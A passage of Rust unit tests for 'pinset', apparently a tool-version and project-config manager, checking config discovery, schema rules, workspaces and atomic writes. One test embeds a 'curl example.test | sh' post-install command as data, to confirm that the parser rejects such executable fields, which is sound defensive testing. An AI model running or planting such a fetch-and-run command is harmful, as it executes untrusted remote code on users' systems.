    now: std::time::SystemTime,
) -> Result<()> {
    for tool in &lockfile.tools {
        crate::validate_tool_policy(
            tool,
            config.policy.verification_strength,
            config.policy.minimum_release_age,
            now,
        )?;
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use std::fs;
    #[cfg(feature = "project-write")]
    use std::sync::{Arc, Barrier};

    use tempfile::tempdir;

    use super::*;

    #[test]
    fn finds_nearest_config_from_nested_directory() {
        let root = tempdir().expect("temp directory");
        let nested = root.path().join("packages").join("web").join("src");
        fs::create_dir_all(&nested).expect("nested directory");
        fs::create_dir(root.path().join(".git")).expect("git marker");
        fs::write(
            root.path().join("pinset.toml"),
            "schema = 1\n[tools]\nnode = \"20.0.0\"\n",
        )
        .expect("root config");

        let package = root.path().join("packages").join("web");
        fs::write(
            package.join("pinset.toml"),
            "schema = 1\n[tools]\nnode = \"22.0.0\"\n",
        )
        .expect("package config");

        assert_eq!(
            find_project_config(&nested).expect("config"),
            package.join("pinset.toml")
        );
    }

    #[test]
    fn git_boundary_prevents_parent_project_capture() {
        let root = tempdir().expect("temp directory");
        let repository = root.path().join("repo");
        let nested = repository.join("packages").join("app");
        fs::create_dir_all(repository.join(".git")).expect("git marker");
        fs::create_dir_all(&nested).expect("nested directory");
        fs::write(
            root.path().join(PROJECT_CONFIG_FILENAME),
            "schema = 3\n[tools]\nnode = \"24\"\n",
        )
        .expect("parent config");

        let context = find_project_context(&nested).expect("project context");
        assert_eq!(context.boundary, repository);
        assert_eq!(context.config_path, None);
    }

    #[test]
    fn filesystem_policy_can_cross_the_git_boundary() {
        let root = tempdir().expect("temp directory");
        let repository = root.path().join("repo");
        let nested = repository.join("packages").join("app");
        fs::create_dir_all(repository.join(".git")).expect("git marker");
        fs::create_dir_all(&nested).expect("nested directory");
        let parent_config = root.path().join(PROJECT_CONFIG_FILENAME);
        fs::write(
            &parent_config,
            "schema = 3\n[policy]\nboundary = \"filesystem\"\n[tools]\n",
        )
        .expect("parent config");

        let context = find_project_context(&nested).expect("project context");
        assert_eq!(context.config_path, Some(parent_config));
        assert_eq!(context.boundary, filesystem_root(&nested));
    }

    #[test]
    fn rejects_executable_or_unknown_config_fields() {
        let root = tempdir().expect("temp directory");
        let config_path = root.path().join("pinset.toml");
        fs::write(
            &config_path,
            "schema = 1\npost_install = \"curl example.test | sh\"\n[tools]\nnode = \"20\"\n",
        )
        .expect("config");

        let error = load_project_config(&config_path).expect_err("unknown field must fail");
        assert!(matches!(error, Error::ParseProjectConfig { .. }));
    }

    #[test]
    fn rejects_unknown_schema() {
        let root = tempdir().expect("temp directory");
        let config_path = root.path().join("pinset.toml");
        fs::write(&config_path, "schema = 6\n[tools]\nnode = \"20\"\n").expect("config");

        let error = load_project_config(&config_path).expect_err("schema must fail");
        assert!(matches!(error, Error::UnsupportedSchema { actual: 6 }));
    }

    #[test]
    fn schema_five_validates_tasks_and_variable_contracts() {
        let root = tempdir().expect("temp directory");
        let path = root.path().join(PROJECT_CONFIG_FILENAME);
        fs::write(
            &path,
            r#"schema = 5
project-id = "4c5652e4-0000-4000-8000-000000000004"

[tools]

[tasks.test]
command = ["cargo", "test"]
profile = "test"

[environment.profiles.test]
file = "pinset.env/test.age"
recipients = ["age1test"]

[environment.variables.PORT]
type = "integer"
required = true
profiles = ["test"]

[environment.variables.MODE]
type = "enum"
default = "development"
values = ["development", "production"]
"#,
        )
        .expect("schema five config");

        let config = load_project_config(&path).expect("valid schema five config");
        assert_eq!(config.tasks["test"].command, vec!["cargo", "test"]);
        assert_eq!(
            config.environment.as_ref().expect("environment").variables["PORT"].kind,
            EnvironmentVariableType::Integer
        );

        fs::write(
            &path,
            r#"schema = 4
project-id = "4c5652e4-0000-4000-8000-000000000004"
[tools]
[tasks.test]
command = ["cargo", "test"]
"#,
        )
        .expect("legacy config with task");
        assert!(matches!(
            load_project_config(&path),
            Err(Error::InvalidProjectConfig { .. })
        ));
    }

    #[test]
    fn schema_five_validates_named_python_environments_and_task_bindings() {
        let root = tempdir().expect("temp directory");
        let path = root.path().join(PROJECT_CONFIG_FILENAME);
        fs::write(
            &path,
            r#"schema = 5
project-id = "4c5652e4-0000-4000-8000-000000000027"

[tools]
python = "3.14"

[python.environments.docs]
path = ".venv-docs"

[tasks.docs]
command = ["mkdocs", "serve"]
python-environment = "docs"
"#,
        )
        .expect("named environment config");
        let config = load_project_config(&path).expect("valid named environment");
        assert_eq!(
            config.python.as_ref().expect("Python config").environments["docs"].path,
            ".venv-docs"
        );
        assert_eq!(
            config.tasks["docs"].python_environment.as_deref(),
            Some("docs")
        );

        let invalid = fs::read_to_string(&path).expect("config").replace(
            "python-environment = \"docs\"",
            "python-environment = \"missing\"",
        );
        fs::write(&path, invalid).expect("invalid binding");
        assert!(matches!(
            load_project_config(&path),
            Err(Error::InvalidProjectConfig { .. })
        ));
    }

    #[test]
    fn workspace_members_inherit_root_defaults_with_whole_tool_option_overrides() {
        let root = tempdir().expect("workspace");
        fs::create_dir(root.path().join(".git")).expect("git boundary");
        let member = root.path().join("apps/api");
        fs::create_dir_all(&member).expect("member");
        let root_config = root.path().join(PROJECT_CONFIG_FILENAME);
        fs::write(
            &root_config,
            r#"schema = 5
project-id = "4c5652e4-0000-4000-8000-000000000028"

[workspace]
members = ["apps/api"]

[tools]
node = "24"
python = "3.13"
rust = "stable"

[tool-options.rust]
profile = "complete"
components = ["rustfmt", "clippy"]

[tasks.test]
command = ["cargo", "test", "--workspace"]

[python.environments.docs]
path = ".venv-docs"

[environment.profiles.dev]
file = ".env.dev.age"
recipients = ["age1workspace"]
"#,
        )
        .expect("root config");
        let member_config = member.join(PROJECT_CONFIG_FILENAME);
        fs::write(
            &member_config,
            r#"schema = 5
project-id = "4c5652e4-0000-4000-8000-000000000029"

[tools]
rust = "1.97"

[tasks.test]
command = ["cargo", "test", "-p", "api"]
profile = "dev"
python-environment = "docs"
"#,
        )
        .expect("member config");

        let effective = load_effective_project_config(&member_config).expect("effective member");
        load_project_config(&member_config).expect("contextually valid member");
        assert_eq!(effective.tools["node"], "24");
        assert_eq!(effective.tools["rust"], "1.97");
        assert!(!effective.tool_options.contains_key("rust"));
        assert_eq!(
            effective.tasks["test"].command,
            ["cargo", "test", "-p", "api"]
        );
        assert_eq!(effective.tasks["test"].profile.as_deref(), Some("dev"));
        assert_eq!(
            effective.tasks["test"].python_environment.as_deref(),
            Some("docs")
        );
        assert_eq!(
            find_workspace_config(&member).expect("workspace config"),
            root_config
        );
        let members = workspace_members(&root_config).expect("members");
        assert_eq!(members.len(), 1);
        assert_eq!(members[0].name, "apps/api");
    }

    #[test]
    fn variable_contracts_reject_invalid_defaults_and_secret_defaults() {
        let contract = EnvironmentVariableContract {
            kind: EnvironmentVariableType::Integer,
            required: false,
            secret: false,
            default: None,
            profiles: Vec::new(),
            values: Vec::new(),
            description: None,
        };
        assert!(validate_environment_variable_value("PORT", &contract, "42").is_ok());
        assert!(validate_environment_variable_value("PORT", &contract, "4.2").is_err());

        let root = tempdir().expect("temp directory");
        let path = root.path().join(PROJECT_CONFIG_FILENAME);
        fs::write(
            &path,
            r#"schema = 5
project-id = "4c5652e4-0000-4000-8000-000000000005"
[tools]
[environment.variables.TOKEN]
secret = true
default = "unsafe"
"#,
        )
        .expect("invalid secret default");
        assert!(matches!(
            load_project_config(&path),
            Err(Error::InvalidProjectConfig { .. })
        ));
    }

    #[test]
    fn schema_five_accepts_structured_rust_options_and_canonicalizes_identity_fields() {
        let root = tempdir().expect("temp directory");
        let path = root.path().join(PROJECT_CONFIG_FILENAME);
        fs::write(
            &path,
            r#"schema = 5
project-id = "4c5652e4-0000-4000-8000-000000000026"

[tools]
rust = "nightly"

[tool-options.rust]
profile = "minimal"
components = ["rustfmt", "clippy"]
targets = ["wasm32-unknown-unknown"]
date = "2026-07-16"
"#,
        )
        .expect("structured Rust config");

        let config = load_project_config(&path).expect("valid structured Rust config");
        assert_eq!(
            config.tool_options["rust"].lock_options(),
            BTreeMap::from([
                ("components".to_owned(), "clippy,rustfmt".to_owned()),
                ("date".to_owned(), "2026-07-16".to_owned()),
                ("profile".to_owned(), "minimal".to_owned()),
                ("targets".to_owned(), "wasm32-unknown-unknown".to_owned()),
            ])
        );
    }

    #[cfg(feature = "project-write")]
    #[test]
    fn atomically_creates_a_minimal_project_config() {
        let root = tempdir().expect("temp directory");
        let path = create_project_config(root.path()).expect("create project config");

        assert_eq!(path, root.path().join(PROJECT_CONFIG_FILENAME));
        let created = load_project_config(&path).expect("load created config");
        assert_eq!(created.schema, PROJECT_CONFIG_SCHEMA);
        assert!(created.project_id.is_some());
        assert_eq!(created.policy, ProjectPolicy::default());
        assert!(created.tools.is_empty());
        assert!(created.environment.is_none());
    }

    #[cfg(feature = "project-write")]
    #[test]
    fn refuses_to_overwrite_an_existing_project_config() {
        let root = tempdir().expect("temp directory");
        let path = root.path().join(PROJECT_CONFIG_FILENAME);
        let original = "schema = 1\n\n[tools]\nnode = \"24\"\n";
        fs::write(&path, original).expect("existing config");

        let error = create_project_config(root.path()).expect_err("must not overwrite");
        assert!(matches!(error, Error::ProjectConfigAlreadyExists { .. }));
        assert_eq!(fs::read_to_string(path).expect("existing config"), original);
        assert_eq!(
            fs::read_dir(root.path())
                .expect("project directory")
                .count(),
            1
        );
    }

    #[cfg(feature = "project-write")]
    #[test]
    fn concurrent_initialization_has_exactly_one_winner() {
        let root = tempdir().expect("temp directory");
        let project = Arc::new(root.path().to_path_buf());
        let barrier = Arc::new(Barrier::new(3));
        let mut workers = Vec::new();

        for _ in 0..2 {
            let project = Arc::clone(&project);
            let barrier = Arc::clone(&barrier);
            workers.push(std::thread::spawn(move || {
                barrier.wait();
                create_project_config(&project)
            }));
        }
        barrier.wait();

        let results = workers
            .into_iter()
            .map(|worker| worker.join().expect("init worker"))
            .collect::<Vec<_>>();
        assert_eq!(results.iter().filter(|result| result.is_ok()).count(), 1);
        assert_eq!(
            results
                .iter()
                .filter(|result| matches!(result, Err(Error::ProjectConfigAlreadyExists { .. })))
                .count(),
            1
        );
        load_project_config(&project.join(PROJECT_CONFIG_FILENAME))
            .expect("winning config is complete");
    }

    #[cfg(feature = "project-write")]
    #[test]
    fn atomically_updates_project_tools() {
        let root = tempdir().expect("temp directory");
        let path = create_project_config(root.path()).expect("create config");
        let mut config = load_project_config(&path).expect("load config");
        config.set_tool("node", "24.0.0");

        save_project_config(&path, &config).expect("save config");

        assert_eq!(
            load_project_config(&path)
                .expect("reload config")
                .tools
                .get("node")
                .map(String::as_str),
            Some("24.0.0")
        );
    }

    #[cfg(feature = "project-write")]
    #[test]
    fn saving_schema_four_does_not_enable_schema_five_implicitly() {
        let root = tempdir().expect("temp directory");
        let path = root.path().join(PROJECT_CONFIG_FILENAME);
        let config = ProjectConfig {
            schema: 4,
            project_id: Some("4c5652e4-0000-4000-8000-000000000006".to_owned()),
            policy: ProjectPolicy::default(),
            tools: BTreeMap::new(),
            tool_options: Default::default(),
            tasks: BTreeMap::new(),
            python: None,
            workspace: None,
            environment: None,
        };
        save_project_config(&path, &config).expect("save schema four");
        assert_eq!(
            load_project_config(&path).expect("load schema four").schema,
            4
        );
    }

    #[test]
    fn parses_optional_provenance_policy_without_changing_schema_three() {
        let root = tempdir().expect("project");
        let path = root.path().join(PROJECT_CONFIG_FILENAME);
        fs::write(
            &path,
            "schema = 3\n[policy]\nverification-strength = \"signed-checksum\"\nminimum-release-age = \"7d\"\n[tools]\nnode = \"24\"\n",
        )
        .expect("policy config");

        let config = load_project_config(&path).expect("load policy");
        assert_eq!(
            config.policy.verification_strength,
            Some(VerificationStrength::SignedChecksum)
        );
        assert_eq!(
            config
                .policy
                .minimum_release_age
                .expect("minimum age")
                .as_duration(),
            std::time::Duration::from_secs(7 * 86_400)
        );

        fs::write(
            &path,
            "schema = 3\n[policy]\nminimum-release-age = \"0d\"\n[tools]\n",
        )
        .expect("invalid policy config");
        assert!(matches!(
            load_project_config(&path),
            Err(Error::ParseProjectConfig { .. })
        ));
    }

    #[cfg(all(feature = "project-write", feature = "lockfile"))]
    #[test]
    fn saves_a_validated_project_config_and_lock_pair() {
        let root = tempdir().expect("project");
        let config_path = root.path().join(PROJECT_CONFIG_FILENAME);
        let config = ProjectConfig {
            schema: PROJECT_CONFIG_SCHEMA,
            project_id: Some(uuid::Uuid::new_v4().to_string()),
            policy: ProjectPolicy::default(),
            tools: BTreeMap::new(),
            tool_options: Default::default(),
            tasks: BTreeMap::new(),
            python: None,
            workspace: None,
            environment: None,
        };
        let lockfile = Lockfile {
            schema: crate::LOCKFILE_SCHEMA,
            generated_by: "pinset test".to_owned(),
            tools: Vec::new(),
        };

        save_project_state(root.path(), &config_path, &config, &lockfile)
            .expect("save project state");

        assert_eq!(load_project_config(&config_path).expect("config"), config);
        assert_eq!(
            crate::load_lockfile(&lockfile_path(&config_path)).expect("lock"),
            lockfile
        );
    }
}
